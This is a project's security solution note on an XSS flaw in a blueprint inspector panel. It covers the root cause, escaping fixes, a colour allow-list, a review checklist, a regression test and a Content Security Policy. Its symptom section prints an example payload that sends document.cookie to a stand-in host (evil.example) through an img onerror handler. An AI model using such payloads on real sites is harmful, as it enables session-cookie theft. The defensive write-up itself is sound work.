---
title: XSS vulnerability in intention inspector panel via unescaped blueprint fields
date: 2026-02-28
category: security-issues
tags:
  - xss
  - innerHTML
  - escaping
  - blueprint
  - inspector
  - controls
  - indexeddb
  - user-content
  - html-injection
module: Inspector/UI system (src/viewer/controls.js)
symptom: Latent XSS — no visible symptom, but crafted blueprint imports with HTML/JS in fields like monomerName or cellName execute arbitrary scripts in the inspector panel
root_cause: escHtml() helper existed and was used for blueprint name but was never applied to requirement detail fields (monomerName, cellName, species, element symbols, roles, etc.) rendered via innerHTML, making attacker-controlled IndexedDB catalogue data injectable as raw HTML
---

# XSS Vulnerability in Intention Inspector Panel via Unescaped Blueprint Fields

## Problem Symptom

**Latent XSS — no visible symptom under normal use.** A user who imports or creates a blueprint with HTML/JavaScript in string fields like `monomerName`, `cellName`, `species`, `elements[]`, or polymer `role` names would cause arbitrary script execution when that blueprint's intention is selected in the inspector panel.

Example attack payload in a crafted blueprint JSON:

```json
{
  "monomerName": "<img src=x onerror=\"window.location='https://evil.example/?c='+document.cookie\">",
  "cellName": "<script>alert(document.origin)</script>"
}
```

Because the inspector assigned this data directly to `content.innerHTML`, the browser would parse and execute the injected HTML/JS.

---

## Root Cause

The `controls.js` intention inspector builds an HTML string for `content.innerHTML` by interpolating blueprint requirement fields directly into a template literal. An `escHtml()` helper function has existed at line 6 of the file since it was introduced to escape `bpName` in the header, but it was never applied to the detailed requirement fields inside the `reqDetails` building block.

The structural omission was two-part:

1. The `reqDetails` block (all `requirements?.type` branches — atoms, monomers, molecules, polymers, cells) composed an `html` string by concatenating requirement field values — atom element symbols, monomer names, monomer formulas, cell names, species, polymer role names — without escaping any of them.
2. The outer `content.innerHTML` template additionally interpolated `intention.type` and `reqCount` without escaping.

Blueprint data originates in IndexedDB. It is populated by free-text user input (name/formula prompts) or via the catalogue's JSON import feature, making it attacker-controlled relative to the rendering layer.

`escHtml()` converts `&`, `<`, `>`, `"`, `'` to their HTML entity equivalents, preventing the browser from interpreting injected characters as markup. It was already protecting `bpName` (one call site) — but the 12+ other fields in `reqDetails` were unprotected.

---

## Files Changed

- `src/viewer/controls.js` — `reqDetails` building block (all `requirements?.type` branches) and two remaining interpolations in `content.innerHTML`
- `index.html` — auto-regenerated bundle

---

## Working Fix

### 1. The `escHtml()` helper (pre-existing)

```javascript
function escHtml(str) {
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}
```

Defined at `src/viewer/controls.js:6`. Also duplicated in `src/main.js` and `src/viewer/catalogue-ui.js` — see Technical Debt below.

### 2. String fields — `escHtml()` at the interpolation site

Before/after patterns for each field category:

```javascript
// ── Atom symbols (in elementCounts loop) ──────────────────────────────────
// BEFORE:
.map(([sym, count]) => `${sym}: ${count}`)
// AFTER:
.map(([sym, count]) => `${escHtml(sym)}: ${count}`)

// ── Arrays of element / role names ───────────────────────────────────────
// BEFORE:
(requirements.elements || []).map(e => e).join(', ')
// AFTER:
(requirements.elements || []).map(escHtml).join(', ')

// ── Single name / formula strings ────────────────────────────────────────
// BEFORE:
requirements.monomerName || 'Unknown'
// AFTER:
escHtml(requirements.monomerName || 'Unknown')

// ── Optional fields — guard before escaping (prevents literal "null") ────
// BEFORE:
requirements.monomerFormula ? requirements.monomerFormula : null
// AFTER:
requirements.monomerFormula ? escHtml(requirements.monomerFormula) : null

// ── Top-level template fields ─────────────────────────────────────────────
// BEFORE:
`<p>Type: ${intention.type}</p>`
`... / ${reqCount}`
// AFTER:
`<p>Type: ${escHtml(intention.type)}</p>`
`... / ${escHtml(String(reqCount))}`
```

### 3. Numeric fields — `Number()` coercion instead of escaping

Fields like `req.count` and `req.minChainLength` are expected to be integers. Casting via `Number()` converts any non-numeric payload (including XSS strings) to `NaN`, and `|| 0` normalises that to zero:

```javascript
// BEFORE:
req.count          // could be any string
// AFTER:
Number(req.count) || 0   // always a safe integer
```

`Number('<img src=x onerror=alert(1)>')` → `NaN` → `0`.

### 4. CSS color — allow-list regex instead of HTML-escaping

`escHtml()` is **insufficient** for values placed inside a CSS `style` attribute. A value like `red; } body{display:none}` contains no HTML-special characters, yet breaks the style context. The fix validates against an explicit allow-list and falls back to a hardcoded default:

```javascript
// BEFORE:
const color = requirements.color || '#8b5cf6';
// (used directly in: `style="color: ${color};"`)

// AFTER:
const rawColor = requirements.color || '';
const color = /^#[0-9a-fA-F]{3,6}$|^[a-zA-Z]+$/.test(rawColor) ? rawColor : '#8b5cf6';
```

Only hex colors (`#fff`, `#8b5cf6`) and plain alphabetic named colors (`red`, `purple`) pass. Everything else gets the design-system fallback.

---

## Investigation Steps

This issue was surfaced by the `security-sentinel` review agent during a multi-agent code review of the `fix/intention-display-bugs` branch. No runtime exploitation was observed — the fix was preventive, caught in review before merge.

- **Scope confirmed**: `src/viewer/controls.js`, intention inspector section (~lines 640–780)
- **Attack surface**: `IndexedDB catalogue → requirements fields → innerHTML`
- **Prior state**: `bpName` was already escaped (one protected call site); all `reqDetails` fields were not

---

## Related Documentation

- **[`docs/solutions/logic-errors/monomers-invisible-monomer-blueprints-CatalogueSystem-20260226.md`](../logic-errors/monomers-invisible-monomer-blueprints-CatalogueSystem-20260226.md)** — First documented application of `escHtml()` to blueprint fields in the inspector. Fix 4 covers `_showBlueprintInspector()` in `catalogue-ui.js` with the canonical escaping pattern.

- **[`docs/solutions/test-failures/playwright-test-infrastructure-audit-8-findings-20260226.md`](../test-failures/playwright-test-infrastructure-audit-8-findings-20260226.md)** — P2 finding documents 7 XSS injection points in `src/main.js` blueprint palette rendering, defines the `escHtml()` function, and notes the per-file duplication as intentional technical debt pointing toward a future `utils.js` consolidation.

---

## Prevention Strategies

### Rule: Escape at the sink, not the source

Escape at the `innerHTML` assignment site — not where the value is read from IndexedDB. Escaping at the source creates false safety because a pre-escaped value may be passed to non-HTML contexts (CSS, logs, JSON) where HTML-escaping is wrong or insufficient.

```javascript
// CORRECT — escape at the interpolation site
content.innerHTML = `<span>${escHtml(bp.name)}</span>`;

// WRONG — escaping earlier, trusting the result downstream
const safeName = escHtml(bp.name);
otherFunction(safeName);  // may be used as textContent later, making the entities visible
```

### Checklist for reviewing inspector / UI code

- [ ] Search the diff for `.innerHTML =`, `insertAdjacentHTML(`, `document.write(`. Every hit is a potential sink.
- [ ] Trace every `${...}` in the template. Classify as: **(a)** hardcoded literal, **(b)** numeric → `Number() || 0`, **(c)** CSS color → allow-list regex, or **(d)** string → `escHtml()`.
- [ ] Reject any interpolation not covered by one of the four categories.
- [ ] Flag `onclick="${...}"` patterns inside `innerHTML` strings — event handler attributes in templates execute as JS even if surrounding content is escaped.
- [ ] Confirm `escHtml()` is called at the interpolation site, not on a pre-processed copy of the string.

### Prefer `textContent` for pure-text fields (eliminates the surface entirely)

For content that is plain text (names, descriptions, counts), use the DOM API. `textContent` cannot create DOM elements from its input regardless of what the string contains — no escaping is needed or possible to forget:

```javascript
// Structurally safe — no escaping required:
const nameEl = document.createElement('span');
nameEl.textContent = bp.name;
content.appendChild(nameEl);
```

### Playwright regression test sketch

```javascript
const XSS_PAYLOAD = '<img src=x onerror="window.__xssTriggered=true">';

test('inspector escapes blueprint fields containing HTML', async ({ page }) => {
    await page.goto('dev.html');

    // Inject a crafted blueprint (test scaffolding — equivalent to setting spawner.zone)
    await page.evaluate((payload) => {
        const bp = new MoleculeBlueprint({
            id: 'xss-test', name: payload, atoms: [], bonds: []
        });
        window.cellApp.catalogue.molecules.set('xss-test', bp);
    }, XSS_PAYLOAD);

    await page.click('#playPauseBtn');  // mandatory: simulation must run

    await page.evaluate(() => {
        const bp = window.cellApp.catalogue.molecules.get('xss-test');
        const intent = new Intention('molecule', bp, 1000, 1000);
        window.cellApp.environment.addIntention(intent);
        window.cellApp.viewer.selectedIntention = intent;
        window.cellApp.viewer.renderInspector?.();
    });

    await page.waitForTimeout(200);

    const triggered = await page.evaluate(() => window.__xssTriggered === true);
    expect(triggered, 'XSS payload must not execute').toBe(false);
    await expect(page.locator('#inspector img[src="x"]')).toHaveCount(0);
});
```

### Priority-ordered structural improvements

| Priority | Action | Effort |
|---|---|---|
| 1 | Move `escHtml()` to `src/core/utils.js` — available to all future modules | 30 min |
| 2 | Rewrite pure-text inspector fields using `textContent` / DOM API | 1–2 h |
| 3 | Add Playwright XSS regression test | 1 h |
| 4 | Add CSP `<meta>` tag to `dev.html` and bundle | 1 h |
| 5 | Add `escHtml()` unit test (Deno test runner) | 30 min |
| 6 | grep-based CI check for unescaped `innerHTML` | 30 min |

### Content Security Policy (defense in depth)

A CSP prevents injected scripts from executing even if escaping is missed. For this static-file app, add a `<meta>` tag:

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self';
               style-src 'self' 'unsafe-inline';
               img-src 'self' data:;
               connect-src 'self' blob:;
               object-src 'none';
               base-uri 'self'">
```

`script-src 'self'` blocks inline event handlers (`onerror`, `onclick`), making `<img onerror=...>` payloads inert even if they reach the DOM. Check `src/systems/neural-network.js` for `eval()` usage before deploying — if present, `'unsafe-eval'` would be needed, which weakens the policy.

---

## Technical Debt

`escHtml()` is currently **duplicated across three files**:

- `src/main.js` (7 call sites in blueprint palette rendering)
- `src/viewer/catalogue-ui.js` (inspector and palette UI)
- `src/viewer/controls.js` (intention inspector)

The canonical home should be **`src/core/utils.js`**, which loads first in the Deno build order and is available to all subsequent modules. Consolidation was explicitly deferred in each fix to keep scope minimal. A follow-up task should move the definition once and update all three files to use the shared version — this prevents future implementations from missing the function or reimplementing it incorrectly.
